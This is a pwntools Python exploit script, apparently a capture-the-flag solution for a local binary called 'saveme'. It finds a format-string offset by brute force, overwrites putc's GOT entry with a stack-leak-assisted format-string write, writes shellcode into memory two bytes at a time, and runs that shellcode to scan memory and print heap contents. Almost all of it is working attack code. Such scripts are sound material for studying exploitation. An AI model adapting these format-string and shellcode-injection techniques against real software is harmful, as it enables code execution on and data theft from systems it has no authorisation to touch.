#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./saveme", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

offset = None
context.log_level = "critical"
for i in range(1, 20):
    io = start()
    io.sendlineafter(b"option: ", b"2")
    payload = f"%{i}$p".encode()
    payload += b"AAAA"
    payload += b"B" * 7
    pad = len(payload)
    payload += p64(elf.got["putc"])
    io.sendlineafter(b"person: ", payload)
    r = io.recvall(timeout=1).split(b"AAAA")[0]
    if r != b"(nil)" and int(r, 16) == elf.got["putc"]:
        offset = i
        io.close()
        break
    io.close()

context.log_level = "info"
log.info(f"{offset=:}")

pop6 = 0x4015b2

io = start()
io.recvuntil(b"gift: 0x")
stack_leak = int(io.recvuntil(b" ")[:-1], 16)
saved_rbp = stack_leak + 0x60
log.info(f"{stack_leak=:#x}")
log.info(f"{saved_rbp=:#x}")

io.sendlineafter(b"option: ", b"2")
payload = f"%{pop6 & 0xffff}c%{offset}$hn".encode().ljust(pad, b"A")
payload += flat(
    elf.got["putc"],
    0x401531,
    saved_rbp + 0x60,
    0,
    0,
    0,
    0,
    0x4014e8,
)
io.sendlineafter(b"person: ", payload)

"""
This shellcode tries to read from starting from 0x406000 memory address
until it reaches the heap section.
I assume that when it tries to read from unmapped memory address, it returns
0xfffffffffffff2. Thus, the `cmp al, 0xf2` check.
"""
shellcode = asm("""
init:
    xor rdi, rdi
    push 0x406000
    pop rsi
    mov dl, 0xff
run:
    add rsi, 0x1000
    xor rax, rax
    syscall
    cmp al, 0xf2
    je run
    add rsi, 0x2a0
    inc rdi
    mov al, 1
    syscall
""", os="linux", arch="amd64")

sc_addr = 0x405024
for i in range(0, len(shellcode), 2):
    sc = shellcode[i:i + 2]
    print(sc)
    if len(sc) == 1:
        payload = f"%{u8(sc)}c%{offset}$hn".encode()
        if u8(sc) == 0:
            payload = payload[3:]
    else:
        payload = f"%{u16(sc)}c%{offset}$hn".encode()
        if u16(sc) == 0:
            payload = payload[3:]
    payload = payload.ljust(pad, b"A")
    payload += flat(
        sc_addr + i,
        0x401531,
        saved_rbp + 0x60 * (i // 2 + 2),
        0,
        0,
        0,
        0,
        0x4014e8,
    )
    io.sendlineafter(b"person: ", payload)


payload = f"%{sc_addr & 0xffff}c%{offset}$hn".encode().ljust(pad, b"A")
payload += flat(
    elf.got["putc"],
    0x401531,
    saved_rbp + 0x60,
    0,
    0,
    0,
    0,
    0x4014e8,
)
io.sendlineafter(b"person: ", payload)

io.interactive()
